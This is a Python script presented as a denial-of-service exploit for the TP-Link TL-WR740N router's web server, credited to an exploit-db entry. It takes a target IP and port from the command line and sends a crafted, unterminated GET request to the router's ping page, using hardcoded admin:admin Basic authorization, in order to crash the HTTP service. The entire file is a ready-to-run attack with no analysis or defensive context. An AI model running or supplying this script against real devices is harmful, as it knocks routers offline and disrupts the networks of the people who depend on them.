

#    TP-Link TL-WR740N HTTPD denial of service exploit
#    Source:https://www.exploit-db.com/exploits/35345/

from sys import argv, exit
import socket

def DOS():

    buf = "GET /userRpm/PingIframeRpm.htm?ping_addr=google.com&doType=ping&isNew=new&lineNum=1 HTTP/1.1\r\n"
    buf += "Host:"+HOST+"\r\n"
    buf += "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0\r\n"
    buf += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buf += "Accept-Language: en-US,en;q=0.5\r\n"
    buf += "Accept-Encoding: gzip, deflate\r\n"
    buf += "Referer: http://"+HOST+"/userRpm/PingIframeRpm.htm?ping_addr=zeroscience.mk&doType=ping&isNew=new&sendNum=4&pSize=64&overTime=800&trHops=20\r\n"
    buf += "Authorization: Basic YWRtaW46YWRtaW4=\r\n"
    buf += "Connection: keep-alive\r\n"
    buf = buf.encode("utf-8")

    try:

        sock = socket.socket()
        sock.settimeout(3)
        sock.connect( (HOST, int(PORT)) )
        sock.send(buf)
        print('\t[+] Buffer send!')

    except:
            
        print('\t[!] Host is unavailable!')
        exit(0)

def ArgParse():

    try:

        global HOST, PORT
        HOST = argv[1]
        PORT = argv[2]
        print('\n\t[+] Set target %s:%s' % (HOST, PORT))

    except IndexError:

        print('\n\tUsage: %s [IP] [PORT]' % argv[0])
        exit(0)

ArgParse()
DOS()